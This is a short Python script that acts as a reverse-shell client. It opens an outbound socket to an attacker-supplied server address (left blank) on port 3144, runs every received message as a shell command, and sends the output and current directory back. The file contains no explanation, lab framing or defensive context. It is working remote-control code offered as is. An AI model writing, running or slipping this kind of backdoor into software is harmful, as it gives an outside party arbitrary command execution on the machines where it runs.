import os
import socket
import subprocess

# create client socket

host = '' # server ip goes here
port = 3144
s = socket.socket()

# connect to server

s.connect((host,port))


# send client data to server
while True:
    data = s.recv(1024)
    if data[0:2].decode('utf-8') == 'cd':
        os.chdir(data[3:].decode('utf-8'))
    if len(data) > 0:
        command = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output_bytes = command.stdout.read() + command.stderr.read()
        output_str = str(output_bytes, 'utf-8')
        s.send(str.encode(output_str + str(os.getcwd()) + "> "))
        print(output_str)

# close connection

s.close()
